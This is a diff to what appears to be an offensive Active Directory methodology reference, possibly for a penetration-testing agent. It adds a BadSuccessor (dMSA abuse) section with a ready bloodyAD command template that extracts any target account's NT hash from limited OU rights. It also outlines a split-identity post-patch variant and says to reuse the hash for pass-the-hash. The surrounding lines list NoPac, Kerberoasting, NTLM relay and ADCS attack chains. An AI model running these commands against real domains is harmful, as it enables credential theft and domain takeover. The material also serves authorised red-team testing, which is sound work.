@@ -627,6 +627,23 @@ impacket-GetUserSPNs -target-domain OTHERFOREST.LOCAL MYFOREST.LOCAL/user:pass -
 
 ## Bleeding-edge vulnerabilities
 
+### BadSuccessor (dMSA abuse)
+
+Escalate to any account's NT hash using only `CREATE_CHILD` on an OU. Post-patch also requires `WRITE` on the target — these rights can be held by **different actors**.
+
+```bash
+# Single actor (CREATE_CHILD on OU + WRITE on target):
+bloodyAD --host <DC_IP> -d <domain> -u user -k \
+  add badSuccessor <dmsa_name> -t "CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>" \
+  --ou "OU=<ou>,DC=<domain>,DC=<tld>"
+
+# Split-identity (post-patch): use --prepatch to skip target writes, then have
+# the second actor write msDS-Superseded* on the target, then badS4U2self --dmsa.
+# Full pattern: references/kerberos-only-and-badsuccessor.md
+```
+
+Output: target account's RC4/NT hash. Use for NTLM PtH (SMB/WMI) — no AES key is yielded.
+
 ### NoPac (CVE-2021-42278 + CVE-2021-42287)
 
 Escalate from any domain user to DA by spoofing DC sAMAccountName.
@@ -717,6 +734,7 @@ MITRE ATT&CK primary mappings:
 - [references/ad-acl-abuse.md](references/ad-acl-abuse.md) — ACL abuse methodology: GenericAll, WriteDACL, WriteOwner, GenericWrite, shadow credentials, RBCD, and reversible proof paths.
 - [references/kerberos-attacks.md](references/kerberos-attacks.md) — Kerberoasting, AS-REP, delegation abuse (unconstrained/constrained/RBCD), Diamond Ticket, NoPac/sAMAccountName spoofing, double-hop workarounds, ticket forgery.
 - [references/kerberos-time-skew.md](references/kerberos-time-skew.md) — Load when Kerberos authentication fails with `KRB_AP_ERR_SKEW` or Clock skew too great. Covers `faketime` and `ntpdate` synchronization.
+- [references/kerberos-only-and-badsuccessor.md](references/kerberos-only-and-badsuccessor.md) — Load when NTLM is disabled for LDAP, RC4 is banned for AS-REQ, shadow credentials fail with `KDC_ERR_PADATA_TYPE_NOSUPP`, or you need to exploit BadSuccessor (dMSA) in single-actor or split-identity mode.
 - [references/ntlm-relay.md](references/ntlm-relay.md) — Relay chain setup, coercion methods, relay target selection, SOCKS relay for tool chaining.
 - [references/certificate-abuse.md](references/certificate-abuse.md) — ADCS ESC1-14 attack chains, certificate auth, CA enumeration, PKINIT, shadow credentials, Golden Certificate, TLS service impersonation (non-PKINIT cert abuse for WSUS/SCCM/ADFS).
 - [references/ad-services-abuse.md](references/ad-services-abuse.md) — AD-integrated DNS (ADIDNS) record injection via LDAP, rogue WSUS server attack chain (DNS poison + TLS cert + SYSTEM exec), MS DNS record format.
